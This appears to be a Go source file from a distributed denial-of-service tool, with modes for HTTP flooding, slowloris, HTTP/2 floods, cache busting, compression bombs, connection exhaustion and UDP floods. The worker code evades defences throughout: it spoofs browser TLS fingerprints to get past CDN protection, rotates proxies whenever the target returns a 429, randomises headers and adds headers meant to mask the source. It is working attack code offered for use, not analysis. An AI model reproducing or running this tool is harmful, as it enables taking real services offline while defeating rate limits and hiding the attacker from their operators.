package main

import (
	"context"
	"errors"
	"fmt"
	"io"
	mathrand "math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/time/rate"
)

const (
	VOLUME_ATTACK uint8 = iota
	SLOWLORIS_ATTACK
	HTTP2_FLOOD
	CACHE_BUSTING
	API_FUZZING
	WAF_BYPASS
	PROTOCOL_EXPLOIT
	BANDWIDTH_SATURATION
	CONNECTION_EXHAUSTION
	RESOURCE_EXHAUSTION
	UDP_FLOOD
)

type AttackConfig struct {
	AttackType          uint8
	UserAgentRotation   bool
	HeaderRandomization bool
	CacheBusting        bool
	KeepAliveAbuse      bool
	HTTP2Multiplexing   bool
	TLSFingerprinting   bool
	BehaviorMimicking   bool
	// WAFEvasion overlays structural bypass variants (URL encoding, parameter
	// pollution, path normalization) on every request regardless of attack type.
	// distinct from attack type 5 (WAF_BYPASS), which spawns its own request
	// loop, this flag is an additive modifier for all other modes.
	WAFEvasion bool

	// tuning knobs plumbed from flags/config. <= 0 means "use the built in default"
	// so old configs and the zero value still work.
	HTTP2Connections int // type 2, h2 connections to fan streams across
	BombSizeBytes    int // type 7, decompressed gzip-bomb size in bytes
}

// errRateLimited is returned by advancedHTTPCall when the server sends a 429.
// the caller can treat it as a signal to rotate its proxy before the next
// request rather than retrying from an IP the server already blacklisted.
var errRateLimited = errors.New("rate limited")

func calculateRequestSize(req *http.Request) int {
	// Request line: "METHOD /path HTTP/1.1\r\n"
	requestLine := fmt.Sprintf("%s %s %s\r\n", req.Method, req.URL.RequestURI(), "HTTP/1.1")
	totalSize := len(requestLine)

	// Headers: "Header-Name: Header-Value\r\n"
	for name, values := range req.Header {
		for _, value := range values {
			headerLine := fmt.Sprintf("%s: %s\r\n", name, value)
			totalSize += len(headerLine)
		}
	}

	// Host header (automatically added by Go)
	if req.Host != "" {
		hostLine := fmt.Sprintf("Host: %s\r\n", req.Host)
		totalSize += len(hostLine)
	}

	// Empty line separating headers from body
	totalSize += 2 // "\r\n"

	// Body length
	if req.ContentLength > 0 {
		totalSize += int(req.ContentLength)
	}

	return totalSize
}

// implements sophisticated request patterns
func advancedHTTPCall(ctx context.Context, target string, client *http.Client, attackType uint8) error {
	// Handle UDP_FLOOD before any HTTP-specific processing
	if attackType == UDP_FLOOD {
		udpFloodAttack(ctx, target, &config)
		return nil
	}

	// Apply cache busting if enabled (only for HTTP attacks)
	if config.CacheBusting {
		target = generateCacheBustingURL(target)
	}

	method := "GET"
	var body io.Reader

	// Select attack pattern
	switch attackType {
	case API_FUZZING:
		apiFuzzingAttack(target, client)
		return nil
	case WAF_BYPASS:
		wafBypassAttack(target, client)
		return nil
	case HTTP2_FLOOD:
		http2FloodAttack(target, client)
		return nil
	case BANDWIDTH_SATURATION:
		compressionBombAttack(target, client)
		return nil
	case RESOURCE_EXHAUSTION:
		resourceExhaustionAttack(target, client)
		return nil
	case CACHE_BUSTING:
		// always generate a cache-busting URL for this mode regardless of
		// whether the -cache-busting flag was also passed explicitly
		target = generateCacheBustingURL(target)
		var wg sync.WaitGroup
		for i := 0; i < 20; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				volumeRequest(ctx, target, client, attackType)
			}()
		}
		wg.Wait()
		return nil
	case VOLUME_ATTACK:
		var wg sync.WaitGroup
		for i := 0; i < 20; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				volumeRequest(ctx, target, client, attackType)
			}()
		}
		wg.Wait()
		return nil
	default:
		method = httpMethods[mathrand.Intn(len(httpMethods))]
	}

	// when WAFEvasion is on, replace the plain URL+method with a structural
	// bypass variant. all specialized attack paths returned early above, so
	// only the default flood path reaches this. mixing variant pieces (e.g.
	// using variant body with a nonvariant method) would produce malformed
	// requests, so the whole variant wins, it was built as a coherent unit here.
	var wafContentType string
	if config.WAFEvasion {
		var variantBody string
		target, method, variantBody, wafContentType = wafBypassVariant(target)
		if variantBody != "" {
			body = strings.NewReader(variantBody)
		}
	}

	req, err := http.NewRequestWithContext(ctx, method, target, body)
	if err != nil {
		failedRequests.Add(1)
		return err
	}

	// carry the WAF bypass content-type through to the request, but only if
	// the variant actually specified one (most variants leave it empty).
	if wafContentType != "" {
		req.Header.Set("Content-Type", wafContentType)
	}

	// Realistic browser headers
	if config.UserAgentRotation {
		req.Header.Set("User-Agent", realisticUserAgents[mathrand.Intn(len(realisticUserAgents))])
	}

	// Realistic referer patterns
	refererPattern := organicReferers[mathrand.Intn(len(organicReferers))]
	if strings.Contains(refererPattern, "%s") {
		keywords := []string{"login", "search", "home", "products", "services"}
		keyword := keywords[mathrand.Intn(len(keywords))]
		req.Header.Set("Referer", fmt.Sprintf(refererPattern, keyword))
	} else if refererPattern != "" {
		req.Header.Set("Referer", refererPattern)
	}

	// Browser like headers
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("DNT", "1")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	// Add anonymization headers to mask source
	addAnonymizationHeaders(req)

	// Random additional headers to mimic real browsers
	if config.HeaderRandomization {
		if mathrand.Float32() < 0.3 {
			req.Header.Set("Cache-Control", "no-cache")
		}
		if mathrand.Float32() < 0.2 {
			req.Header.Set("Pragma", "no-cache")
		}
		if mathrand.Float32() < 0.4 {
			req.Header.Set("Sec-Fetch-Dest", "document")
			req.Header.Set("Sec-Fetch-Mode", "navigate")
			req.Header.Set("Sec-Fetch-Site", "none")
		}
	}

	// Execute request with rate limit bypass intelligence
	startTime := time.Now()
	resp, err := client.Do(req)
	responseTime := time.Since(startTime)

	if err != nil {
		failedRequests.Add(1)
		demonStats.record(attackType, responseTime.Milliseconds(), false)
		return err
	}
	defer resp.Body.Close()

	// 429 is the server explicitly telling us this IP is rate-limited.
	// respect the Retry-After header up to a short cap, then return the
	// sentinel so the worker knows to rotate its proxy. sleeping 60 seconds
	// and retrying from the same IP is pointless, the server will 429 again
	// the moment the backoff expires.
	if resp.StatusCode == 429 {
		failedRequests.Add(1)
		demonStats.record(attackType, responseTime.Milliseconds(), false)
		wait := 2 * time.Second
		if ra := resp.Header.Get("Retry-After"); ra != "" {
			if secs, parseErr := strconv.Atoi(strings.TrimSpace(ra)); parseErr == nil && secs > 0 {
				wait = time.Duration(secs) * time.Second
				if wait > 10*time.Second {
					wait = 10 * time.Second
				}
			}
		}
		select {
		case <-ctx.Done():
		case <-time.After(wait):
		}
		return errRateLimited
	}

	// other 4xx: forbidden, bad request, gone, we're blocked or sending
	// something the server rejects outright. count as failure and move on.
	if resp.StatusCode >= 400 && resp.StatusCode < 500 {
		failedRequests.Add(1)
		demonStats.record(attackType, responseTime.Milliseconds(), false)
		return nil
	}

	// for pattern-detected rate limits (slowdowns, throttle headers) that
	// aren't an explicit 429, apply a short context-aware backoff. capped at
	// 5s so a single slow response doesn't stall the worker for a full minute.
	if globalDemonConfig != nil && globalDemonConfig.RateLimitBypass && rateLimitDetector != nil {
		if rateLimitDetector.DetectRateLimit(resp, responseTime) {
			backoffDelay := time.Duration(float64(globalDemonConfig.BypassSettings.RecoveryTime) * globalDemonConfig.BypassSettings.BackoffMultiplier)
			if backoffDelay > 5*time.Second {
				backoffDelay = 5 * time.Second
			}
			select {
			case <-ctx.Done():
				return ctx.Err()
			case <-time.After(backoffDelay):
			}
		}
	}

	// Read response to simulate real browser behavior
	responseData, err := io.ReadAll(resp.Body)
	if err != nil {
		failedRequests.Add(1)
		demonStats.record(attackType, responseTime.Milliseconds(), false)
		return err
	}

	// 2xx = clean hit; 5xx = server responded with an error, which can mean
	// overload both count as reaching the server
	requestBytes := calculateRequestSize(req)
	atomic.AddUint64(&totalBytesSent, uint64(requestBytes))
	atomic.AddUint64(&successfulHits, 1)
	demonStats.record(attackType, responseTime.Milliseconds(), true)

	requestTrackingMux.Lock()
	lastRequestURL = target
	lastRequestSize = uint64(requestBytes)
	lastResponseSize = uint64(len(responseData))
	lastResponseCode = uint64(resp.StatusCode)
	lastRequestProto = method
	requestTrackingMux.Unlock()

	return nil
}

// volumeRequest sends a single volume attack request with anonymization
func volumeRequest(ctx context.Context, target string, client *http.Client, attackType uint8) {
	method := httpMethods[mathrand.Intn(len(httpMethods))]

	req, err := http.NewRequestWithContext(ctx, method, target, nil)
	if err != nil {
		failedRequests.Add(1)
		return
	}

	// Realistic browser headers
	if config.UserAgentRotation {
		req.Header.Set("User-Agent", realisticUserAgents[mathrand.Intn(len(realisticUserAgents))])
	}

	// Realistic referer patterns
	refererPattern := organicReferers[mathrand.Intn(len(organicReferers))]
	if strings.Contains(refererPattern, "%s") {
		keywords := []string{"login", "search", "home", "products", "services"}
		keyword := keywords[mathrand.Intn(len(keywords))]
		req.Header.Set("Referer", fmt.Sprintf(refererPattern, keyword))
	} else if refererPattern != "" {
		req.Header.Set("Referer", refererPattern)
	}

	// Browser-like headers
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("DNT", "1")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	// Add anonymization headers to mask source
	addAnonymizationHeaders(req)

	// Random additional headers to mimic real browsers
	if config.HeaderRandomization {
		if mathrand.Float32() < 0.3 {
			req.Header.Set("Cache-Control", "no-cache")
		}
		if mathrand.Float32() < 0.2 {
			req.Header.Set("Pragma", "no-cache")
		}
		if mathrand.Float32() < 0.4 {
			req.Header.Set("Sec-Fetch-Dest", "document")
			req.Header.Set("Sec-Fetch-Mode", "navigate")
			req.Header.Set("Sec-Fetch-Site", "none")
		}
	}

	// Executes request with timing
	startTime := time.Now()
	resp, err := client.Do(req)
	elapsed := time.Since(startTime)
	if err != nil {
		failedRequests.Add(1)
		demonStats.record(attackType, elapsed.Milliseconds(), false)
		return
	}
	defer resp.Body.Close()

	// Read response to simulate real browser behavior
	responseData, err := io.ReadAll(resp.Body)
	if err != nil {
		failedRequests.Add(1)
		demonStats.record(attackType, elapsed.Milliseconds(), false)
		return
	}

	// 4xx = explicitly blocked or rate limited, not a successful hit
	if resp.StatusCode >= 400 && resp.StatusCode < 500 {
		failedRequests.Add(1)
		demonStats.record(attackType, elapsed.Milliseconds(), false)
		return
	}

	requestBytes := calculateRequestSize(req)
	atomic.AddUint64(&totalBytesSent, uint64(requestBytes))
	atomic.AddUint64(&successfulHits, 1)
	demonStats.record(attackType, elapsed.Milliseconds(), true)

	requestTrackingMux.Lock()
	lastRequestURL = target
	lastRequestSize = uint64(requestBytes)
	lastResponseSize = uint64(len(responseData))
	lastResponseCode = uint64(resp.StatusCode)
	lastRequestProto = method
	requestTrackingMux.Unlock()
}

// newWorkerClient builds an http.Client for advancedWorker using the next
// proxy in the pool. factored out so the worker can rebuild its client when
// a 429 signals that the current proxy IP is blocked.
//
// when TLS fingerprinting is enabled we hand the client a uTLS round tripper so
// the handshake mimics a real browser. this is the difference between getting
// blocked at the TLS layer by cloudflare/akamai/aws and actually reaching the
// application. the returned profile carries the matching User-Agent so callers
// can keep the header story consistent with the handshake.
// the returned string is the proxy URL this client was built on ("" for a direct
// connection), so the caller can report the proxy's health back to the pool after
// the request and evict it if it turns out to be dead.
func newWorkerClient(proxyPool *ProxyPool) (*http.Client, browserProfile, string) {
	var proxyURL *url.URL
	proxyStr := proxyPool.GetNext()
	if proxyStr != "" {
		if parsed, err := url.Parse(proxyStr); err == nil {
			proxyURL = parsed
		}
	}

	profile := randomBrowserProfile()

	if config.TLSFingerprinting {
		return &http.Client{
			Transport: newUTLSRoundTripper(profile, proxyURL),
			Timeout:   15 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}, profile, proxyStr
	}

	// stdlib fallback path: still functional against unprotected targets, but
	// emits the detectable go fingerprint. kept so the tool works when the
	// operator has not asked for fingerprint evasion.
	var transport *http.Transport
	if proxyURL != nil {
		transport = createAnonymousTransport(proxyURL)
	} else {
		transport = createIntelligentKeepAliveTransport(config)
	}
	return &http.Client{
		Transport: transport,
		Timeout:   5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}, profile, proxyStr
}

// reactToProxyOutcome feeds the result of an HTTP call back into the proxy pool's
// health tracking and rebuilds the worker's client when it needs a fresh proxy:
//   - errRateLimited: the target throttled this IP. rotate to a fresh proxy, but
//     do NOT strike the current one, a 429 is the target's doing, not a sign the
//     proxy is dead, and striking residential proxies that all get 429'd would
//     evict good infrastructure.
//   - any other error: a transport/dial failure, which usually means the proxy is
//     dead or blocked. report a strike; if that evicts it, rebuild onto a new proxy.
//   - nil: success. clear the proxy's strike count.
func reactToProxyOutcome(pool *ProxyPool, client *http.Client, proxy string, callErr error) (*http.Client, string) {
	switch {
	case errors.Is(callErr, errRateLimited):
		c, _, p := newWorkerClient(pool)
		return c, p
	case callErr != nil:
		if pool.Report(proxy, false) {
			c, _, p := newWorkerClient(pool)
			return c, p
		}
		return client, proxy
	default:
		pool.Report(proxy, true)
		return client, proxy
	}
}

// acquireHeldSlot reserves one of the maxHeldConnections held-connection slots,
// returning false if the cap is already reached. the CAS loop keeps concurrent
// workers from overshooting the cap. releaseHeldSlot frees the slot when the held
// connection closes (deferred by the dispatching goroutine).
func acquireHeldSlot() bool {
	for {
		cur := atomic.LoadInt64(&heldConnActive)
		if cur >= maxHeldConnections {
			return false
		}
		if atomic.CompareAndSwapInt64(&heldConnActive, cur, cur+1) {
			return true
		}
	}
}

func releaseHeldSlot() {
	atomic.AddInt64(&heldConnActive, -1)
}

// AdvancedWorker implements sophisticated attack patterns with anonymization
func advancedWorker(ctx context.Context, id int, jobs <-chan string,
	proxyPool *ProxyPool, limiter *rate.Limiter, attackTypes []uint8) {

	// start with a proxied client; rebuilt via newWorkerClient on 429 or when the
	// current proxy is evicted as dead, so we always rotate to a fresh proxy rather
	// than retrying from a blocked or broken IP. the client pins its own User-Agent
	// to match its TLS handshake, so we don't carry the profile around here; curProxy
	// tracks which proxy this client rides so we can report its health back.
	client, _, curProxy := newWorkerClient(proxyPool)

	// Behavior mimicker for realistic patterns
	mimicker := &BehaviorMimicker{
		sessionDuration: time.Minute * 5,
		thinkTime:       time.Second * 3,
		pageViews:       mathrand.Intn(10) + 1,
		bounceRate:      0.4,
	}

	for {
		select {
		case <-ctx.Done():
			return
		case target, ok := <-jobs:
			if !ok {
				return
			}

			// Intelligent rate limit bypass timing
			if delayManager != nil && globalDemonConfig != nil && globalDemonConfig.RateLimitBypass {
				delayManager.WaitForOptimalTiming()
			}

			// Rate limiting - track workers waiting
			atomic.AddUint64(&workersWaitingOnRate, 1)
			err := limiter.Wait(ctx)
			atomic.AddUint64(&workersWaitingOnRate, ^uint64(0)) // Subtract 1
			if err != nil {
				continue
			}

			atomic.AddUint64(&totalConnections, 1)

			// pick the attack type for this job. single-type runs always use
			// attackTypes[0]; hybrid runs pick randomly so workers spread
			// across the entire pool each iteration.
			at := attackTypes[0]
			if len(attackTypes) > 1 {
				at = attackTypes[mathrand.Intn(len(attackTypes))]
			}

			// Execute attack based on configuration
			switch at {
			case SLOWLORIS_ATTACK, PROTOCOL_EXPLOIT, CONNECTION_EXHAUSTION:
				// connection-hold attacks: fire-and-forget so the worker keeps
				// accepting jobs while the connection is held open. bounded by the
				// held-connection cap, without it a long run dispatches one held
				// goroutine per job and exhausts our OWN fds/memory before the target's.
				if !acquireHeldSlot() {
					atomic.AddUint64(&heldConnSkipped, 1)
					break
				}
				go func(at uint8, tgt string) {
					defer releaseHeldSlot()
					switch at {
					case SLOWLORIS_ATTACK:
						slowlorisAttack(ctx, tgt, time.Minute*5)
					case PROTOCOL_EXPLOIT:
						// slow POST body: holds one server read-thread per goroutine
						protocolExploitAttack(ctx, tgt)
					case CONNECTION_EXHAUSTION:
						// silent TCP/TLS hold: exhausts server fd table over time
						connectionExhaustionAttack(ctx, tgt)
					}
				}(at, target)
			case VOLUME_ATTACK:
				if config.BehaviorMimicking {
					mimicker.SimulateUserSession(ctx, target, client, at)
				} else {
					callErr := advancedHTTPCall(ctx, target, client, at)
					client, curProxy = reactToProxyOutcome(proxyPool, client, curProxy, callErr)
				}
			default:
				callErr := advancedHTTPCall(ctx, target, client, at)
				client, curProxy = reactToProxyOutcome(proxyPool, client, curProxy, callErr)
			}
		}
	}
}
